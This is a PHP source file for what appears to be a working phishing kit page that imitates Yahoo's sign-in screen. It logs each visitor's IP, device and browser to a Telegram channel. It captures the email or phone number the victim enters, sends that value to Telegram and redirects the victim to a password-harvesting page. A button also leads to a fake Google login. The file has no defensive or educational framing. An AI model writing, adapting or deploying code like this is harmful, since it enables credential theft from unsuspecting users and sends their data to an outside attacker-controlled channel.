<?php
// index.php — Yahoo Page 1: Email/phone, matches screenshot 1 exactly
require 'config.php';
require 'helpers.php';
session_start();

if (empty($_SESSION['visitor_id'])) {
    $_SESSION['visitor_id'] = bin2hex(random_bytes(16));
}
$sid = $_SESSION['visitor_id'];
$ua  = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
$dev = detect_device($ua);

if (empty($_SESSION['tg_notified'])) {
    $_SESSION['tg_notified'] = true;
    tg_send(
        "🟣 <b>NEW YAHOO VISITOR</b>\n\n" .
        "🆔 ID: <code>{$sid}</code>\n" .
        "🌐 IP: <code>" . ($_SERVER['REMOTE_ADDR'] ?? '?') . "</code>\n" .
        "📱 Device: {$dev['type']}\n" .
        "💻 OS: {$dev['os']}\n" .
        "🌍 Browser: {$dev['browser']}\n" .
        "⏰ Time: " . date('H:i:s d/m/Y') . "\n\n" .
        "⏳ Waiting for email/phone..."
    );
}

$error     = '';
$field_err = false;

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = trim($_POST['email'] ?? '');
    if ($email === '') {
        $error = 'Please enter your email or phone number.';
        $field_err = true;
    } elseif (!filter_var($email, FILTER_VALIDATE_EMAIL)
           && !preg_match('/^\+?[\d\s\-]{7,15}$/', $email)) {
        $error = "Sorry, we don't recognize this email or phone number.";
        $field_err = true;
    } else {
        $_SESSION['email'] = $email;
        tg_send(
            "📧 <b>Yahoo Email/Phone Entered</b>\n" .
            "🆔 ID: <code>{$sid}</code>\n" .
            "📨 Value: <code>{$email}</code>\n\n" .
            "➡️ Moving to password page..."
        );
        header('Location: password.php');
        exit;
    }
}

page_open('Sign in to Yahoo', '');
?>

<div class="card">
  <h1 class="card-title">Sign in to Yahoo</h1>

  <form method="POST" id="emailForm" novalidate>

    <label class="field-label <?= $field_err ? 'err' : '' ?>" for="emailInput">
      Username, email or phone number
    </label>

    <div class="yahoo-field">
      <input type="text" name="email" id="emailInput"
             class="yahoo-input <?= $field_err ? 'err' : '' ?>"
             value="<?= htmlspecialchars($_POST['email'] ?? '') ?>"
             autocomplete="email" inputmode="email" />
    </div>

    <?php if ($error): ?>
      <div class="err-text"><?= htmlspecialchars($error) ?></div>
    <?php else: ?>
      <div class="err-text" id="emailErr"></div>
    <?php endif; ?>

    <!-- Stay signed in + Forgot username — same row as screenshot -->
    <div style="display:flex;align-items:center;justify-content:space-between;margin-top:6px">
      <label class="cb-row" style="margin:0">
        <input type="checkbox" name="stay" checked />
        <span class="cb-label">Stay signed in</span>
      </label>
      <a href="#" class="yahoo-link" style="font-size:13px;text-decoration:underline;color:#444">
        Forgot username
      </a>
    </div>

    <button type="submit" class="btn-yahoo">Next</button>

    <div class="or-divider">or</div>

    <!-- Sign in with Google pill button — no underline -->
    <a href="../gmail" style="text-decoration:none;display:block">
      <button type="button" class="btn-google">
        <svg width="18" height="18" viewBox="0 0 24 24">
          <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
          <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
          <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l3.66-2.84z"/>
          <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
        </svg>
        Sign in with Google
      </button>
    </a>

    <div class="create-account">
      <a href="https://login.yahoo.com/account/create">Create account</a>
    </div>

  </form>
</div>

<?php page_close(); ?>
